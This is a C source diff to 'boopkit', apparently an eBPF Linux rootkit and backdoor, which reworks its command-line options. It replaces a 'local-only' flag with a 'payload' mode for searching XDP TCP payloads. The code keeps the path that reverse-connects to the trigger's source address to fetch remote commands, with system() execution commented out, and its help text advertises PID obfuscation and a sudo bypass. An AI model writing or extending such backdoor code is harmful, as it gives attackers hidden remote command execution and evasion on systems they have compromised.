@@ -37,7 +37,7 @@
 // clang-format off
 #include "boopkit.h"
 #include "common.h"
-#include "pr0be.skel.h"
+#include "pr0be.skel.safe.h"
 // clang-format on
 void usage() {
   boopprintf("Boopkit version: %s\n", VERSION);
@@ -50,9 +50,7 @@ void usage() {
   boopprintf("Options:\n");
   boopprintf("-h, help           Display help and usage for boopkit.\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
-  boopprintf(
-      "-l, local-only     Disable dialing the trigger program source address "
-      "for RCE.\n");
+  boopprintf("-p, payload        Search XDP for TCP payload. No reverse connection.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
   boopprintf("\n");
@@ -113,14 +111,14 @@ struct config {
   char pr0besafepath[PATH_MAX];
   char pr0bebooppath[PATH_MAX];
   int denyc;
-  int localonly;
+  int payload;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
 // clisetup will initialize the config struct for the program
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
-  cfg.localonly = 0;
+  cfg.payload = 0;
   cfg.sudobypass = 0;
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
@@ -142,6 +140,9 @@ void clisetup(int argc, char **argv) {
           break;
         case 'h':
           usage();
+          break;
+        case 'p':
+          cfg.payload = 1;
           break;
         case 'q':
           quiet = 1;
@@ -373,8 +374,7 @@ int main(int argc, char **argv) {
         }
         boopprintf("  ** Boop source: %s\n", saddrval);
 
-        // TODO Parse RCE from map/encapsulation and check here
-        if (!cfg.localonly) {
+        if (!cfg.payload) {
           boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
           char *rce = malloc(MAX_RCE_SIZE);
           int retval;
@@ -389,6 +389,8 @@ int main(int argc, char **argv) {
           // boopprintf("  <- Executing: %s\r\n", ret.rce);
           // system(ret.rce);
           // boopprintf("  -> no RCE found!\n");
+          printf("***SEARCH FOR PAYLOAD HERE***\n");
+          exit(1);
         }
       }
       err = bpf_map_delete_elem(fd, &jkey);
